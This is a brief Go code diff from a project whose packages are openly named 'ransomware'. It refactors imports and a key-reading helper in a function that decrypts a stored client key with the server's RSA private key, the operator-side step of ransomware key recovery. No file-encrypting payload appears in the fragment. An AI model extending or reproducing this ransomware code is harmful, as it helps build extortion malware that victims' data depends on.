@@ -4,18 +4,18 @@ import (
 	"encoding/pem"
 	"fmt"
 	"os"
-	enc "ransomware/encryption"
-	"ransomware/io"
+	"ransomware/encryption"
+	"ransomware/encryption/rsaLib"
 )
 
 var (
-	sPrivKey, _ = io.ReadRSAPrivateKey("privateKey.pem")
+	sPrivKey, _ = rsaLib.ReadRSAPrivateKey("privateKey.pem")
 )
 
 func decryptClientKey(path string) {
 	block, _ := os.ReadFile(path)
 
-	decodedBlock := enc.RSAAESDecrypt(block, sPrivKey)
+	decodedBlock := encryption.RSAAESDecrypt(block, sPrivKey)
 
 	pemBlock := &pem.Block{Type: "RSA PRIVATE KEY", Bytes: decodedBlock}
 
